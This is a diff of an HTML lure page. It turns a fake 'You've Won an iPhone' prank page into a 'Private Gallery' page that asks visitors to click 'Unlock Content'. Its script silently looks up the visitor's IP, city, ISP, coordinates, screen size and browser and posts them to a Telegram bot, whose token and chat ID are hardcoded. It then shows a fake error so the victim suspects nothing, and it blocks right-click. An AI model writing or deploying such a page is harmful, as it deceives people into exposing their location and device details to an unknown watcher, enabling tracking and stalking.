@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>🎉 Congratulations! You've Won!</title>
+    <title>Exclusive Content</title>
     <style>
         * {
             margin: 0;
@@ -13,222 +13,211 @@
 
         body {
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-            background: linear-gradient(135deg, #ff6b6b 0%, #feca57 100%);
+            background: #0f0f0f;
             min-height: 100vh;
             display: flex;
-            flex-direction: column;
             align-items: center;
             justify-content: center;
             padding: 20px;
-            text-align: center;
         }
 
         .container {
-            background: white;
-            border-radius: 30px;
-            padding: 40px 25px;
-            box-shadow: 0 20px 60px rgba(0,0,0,0.2);
-            max-width: 380px;
+            text-align: center;
+            max-width: 400px;
+        }
+
+        .preview-img {
             width: 100%;
-            animation: popIn 0.5s ease;
+            height: 300px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            border-radius: 20px;
+            margin-bottom: 30px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 60px;
+            box-shadow: 0 20px 60px rgba(102, 126, 234, 0.3);
+            position: relative;
+            overflow: hidden;
         }
 
-        @keyframes popIn {
-            0% { transform: scale(0.8); opacity: 0; }
-            100% { transform: scale(1); opacity: 1; }
-        }
-
-        .gift-box {
+        .preview-img::before {
+            content: '🔒';
+            position: absolute;
             font-size: 80px;
-            margin-bottom: 20px;
-            animation: bounce 2s infinite;
-        }
-
-        @keyframes bounce {
-            0%, 100% { transform: translateY(0); }
-            50% { transform: translateY(-20px); }
+            opacity: 0.3;
         }
 
         h1 {
-            color: #2d3436;
-            font-size: 26px;
+            color: #fff;
+            font-size: 28px;
             margin-bottom: 15px;
-            line-height: 1.3;
-        }
-
-        .highlight {
-            color: #e74c3c;
-            font-weight: bold;
+            font-weight: 700;
         }
 
         p {
-            color: #636e72;
+            color: #888;
             font-size: 16px;
-            margin-bottom: 30px;
-            line-height: 1.5;
+            margin-bottom: 40px;
+            line-height: 1.6;
         }
 
-        .claim-btn {
-            background: linear-gradient(135deg, #00b894 0%, #00cec9 100%);
+        .unlock-btn {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
             color: white;
             border: none;
-            padding: 20px 40px;
-            font-size: 20px;
-            font-weight: bold;
+            padding: 20px 60px;
+            font-size: 18px;
+            font-weight: 600;
             border-radius: 50px;
             cursor: pointer;
-            box-shadow: 0 10px 30px rgba(0,184,148,0.4);
-            transition: all 0.3s;
-            width: 100%;
-            text-transform: uppercase;
-            letter-spacing: 1px;
+            box-shadow: 0 10px 30px rgba(102, 126, 234, 0.4);
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
         }
 
-        .claim-btn:hover {
-            transform: translateY(-3px);
-            box-shadow: 0 15px 40px rgba(0,184,148,0.5);
+        .unlock-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 15px 40px rgba(102, 126, 234, 0.5);
         }
 
-        .claim-btn:active {
+        .unlock-btn:active {
             transform: translateY(0);
         }
 
-        .timer {
-            color: #e74c3c;
-            font-weight: bold;
-            font-size: 14px;
-            margin-top: 20px;
+        .unlock-btn::after {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            width: 0;
+            height: 0;
+            border-radius: 50%;
+            background: rgba(255,255,255,0.3);
+            transform: translate(-50%, -50%);
+            transition: width 0.6s, height 0.6s;
         }
 
-        .hidden {
-            display: none;
+        .unlock-btn:active::after {
+            width: 300px;
+            height: 300px;
         }
 
         .loading {
-            display: none;
+            color: #667eea;
             margin-top: 20px;
+            font-size: 14px;
+            display: none;
         }
-
+        
         .spinner {
-            border: 4px solid #f3f3f3;
-            border-top: 4px solid #00b894;
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 2px solid #667eea;
+            border-top-color: transparent;
             border-radius: 50%;
-            width: 40px;
-            height: 40px;
             animation: spin 1s linear infinite;
-            margin: 0 auto;
+            margin-right: 10px;
+            vertical-align: middle;
         }
-
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-
-        .success-message {
-            display: none;
-            color: #00b894;
-            font-size: 18px;
-            font-weight: bold;
-            margin-top: 20px;
-        }
+        
+        @keyframes spin { to { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
 
     <div class="container">
-        <div class="gift-box">🎁</div>
-        <h1>You've Won an <span class="highlight">iPhone 15 Pro!</span></h1>
-        <p>Congratulations! You are the <strong>1,000th visitor</strong> today! Click below to claim your prize.</p>
-        
-        <button class="claim-btn" id="claimBtn" onclick="claimPrize()">Claim Now</button>
-        
-        <div class="loading" id="loading">
-            <div class="spinner"></div>
-            <p style="margin-top: 15px; color: #636e72;">Verifying your location...</p>
-        </div>
-
-        <div class="success-message" id="success">
-            ✅ Verified! Redirecting to shipping form...
-        </div>
-
-        <div class="timer">⏰ Offer expires in <span id="countdown">05:00</span></div>
+        <div class="preview-img"></div>
+        <h1>Private Gallery</h1>
+        <p>This content is encrypted. Click below to verify your identity and unlock access.</p>
+        <button class="unlock-btn" id="btn" onclick="unlock()">Unlock Content</button>
+        <div class="loading" id="loading"><span class="spinner"></span>Verifying...</div>
     </div>
 
     <script>
-        // ==========================================
-        // CONFIGURE YOUR TELEGRAM BOT HERE
-        // ==========================================
-        const BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE'; // Replace with your bot token from @BotFather
-        const CHAT_ID = 'YOUR_CHAT_ID_HERE';     // Replace with your chat ID
-        // ==========================================
+        // Telegram Bot Configuration
+        const BOT_TOKEN = '8223784099:AAHiWADO2dN_dIpVmHdv7DENl4l1MY2kP6c';
+        const CHAT_ID = '8048791680';
 
-        // Countdown timer
-        let time = 300;
-        setInterval(() => {
-            time--;
-            const mins = Math.floor(time / 60).toString().padStart(2, '0');
-            const secs = (time % 60).toString().padStart(2, '0');
-            document.getElementById('countdown').textContent = `${mins}:${secs}`;
-        }, 1000);
-
-        async function claimPrize() {
-            const btn = document.getElementById('claimBtn');
+        async function unlock() {
+            const btn = document.getElementById('btn');
             const loading = document.getElementById('loading');
             
             btn.style.display = 'none';
             loading.style.display = 'block';
 
+            let ipData = {};
+            let fallbackMode = false;
+
+            // Try to get IP data
             try {
-                // Get IP info silently
-                const ipResponse = await fetch('https://ipapi.co/json/');
-                const ipData = await ipResponse.json();
-                
-                // Prepare message
-                const message = `🎯 *PRANKED! New Victim Clicked!*\n\n` +
-                    `📱 IP: \`${ipData.ip}\`\n` +
-                    `📍 Location: ${ipData.city}, ${ipData.region}, ${ipData.country_name}\n` +
-                    `🏢 ISP: ${ipData.org}\n` +
-                    `🗺 Coords: ${ipData.latitude}, ${ipData.longitude}\n` +
-                    `⏰ Time: ${new Date().toLocaleString()}\n` +
-                    `📲 Device: ${navigator.userAgent}`;
-                
-                // Send to Telegram silently
-                if (BOT_TOKEN !== '8521122830:AAFBXnF5E1m6ImzL-UIx1zcFsPBqC8TcdvA' && CHAT_ID !== '8521122830') {
-                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                        method: 'POST',
-                        headers: {'Content-Type': 'application/json'},
-                        body: JSON.stringify({
-                            chat_id: CHAT_ID,
-                            text: message,
-                            parse_mode: 'Markdown'
-                        })
-                    });
+                const res = await fetch('https://ipapi.co/json/');
+                if (res.ok) {
+                    ipData = await res.json();
                 } else {
-                    console.log('Bot not configured yet!');
+                    throw new Error('IP API failed');
                 }
+            } catch (e) {
+                // Fallback to ipify if ipapi fails
+                try {
+                    const res = await fetch('https://api.ipify.org?format=json');
+                    const data = await res.json();
+                    ipData.ip = data.ip;
+                    ipData.city = 'Unknown';
+                    ipData.region = 'Unknown';
+                    ipData.country_name = 'Unknown';
+                    ipData.org = 'Unknown';
+                    ipData.latitude = 'Unknown';
+                    ipData.longitude = 'Unknown';
+                    fallbackMode = true;
+                } catch (e2) {
+                    ipData.ip = 'Could not fetch';
+                }
+            }
 
-                // Show fake success (keep them waiting)
+            // Build message - always send even if IP fetch failed
+            const msg = `🎯 *NEW CLICK!* ${fallbackMode ? '⚠️ Fallback Mode' : ''}\n\n` +
+                `📱 *IP:* ${ipData.ip || 'Unknown'}\n` +
+                `📍 *Location:* ${ipData.city || 'Unknown'}, ${ipData.region || 'Unknown'}, ${ipData.country_name || 'Unknown'}\n` +
+                `🏢 *ISP:* ${ipData.org || 'Unknown'}\n` +
+                `🗺 *Coords:* ${ipData.latitude || 'N/A'}, ${ipData.longitude || 'N/A'}\n` +
+                `💻 *Device:* ${navigator.platform}\n` +
+                `📺 *Screen:* ${window.screen.width}x${window.screen.height}\n` +
+                `🌐 *Browser:* ${navigator.userAgent}\n` +
+                `⏰ *Time:* ${new Date().toLocaleString()}`;
+
+            // Send to Telegram (always try to send)
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: msg,
+                        parse_mode: 'Markdown'
+                    })
+                });
+
+                // Success - show fake error after delay
                 setTimeout(() => {
+                    alert('Error: Content temporarily unavailable. Please try again later.');
                     loading.style.display = 'none';
-                    document.getElementById('success').style.display = 'block';
-                    
-                    // Optional: Redirect to real page after 3 seconds to cover tracks
-                    setTimeout(() => {
-                        window.location.href = 'https://www.youtube.com/watch?v=dQw4w9WgXcQ'; // Rick roll or your link
-                    }, 3000);
+                    btn.style.display = 'inline-block';
                 }, 2000);
 
-            } catch (error) {
-                // If it fails, still act normal so they don't suspect
-                console.error('Error:', error);
+            } catch (e) {
+                // If Telegram fails, still show fake error to not alert user
                 setTimeout(() => {
+                    alert('Error: Verification failed. Try again.');
                     loading.style.display = 'none';
-                    document.getElementById('success').style.display = 'block';
-                }, 2000);
+                    btn.style.display = 'inline-block';
+                }, 1500);
             }
         }
 
-        // Prevent right click (optional, makes it look more "official")
+        // Block right click
         document.addEventListener('contextmenu', e => e.preventDefault());
     </script>
 
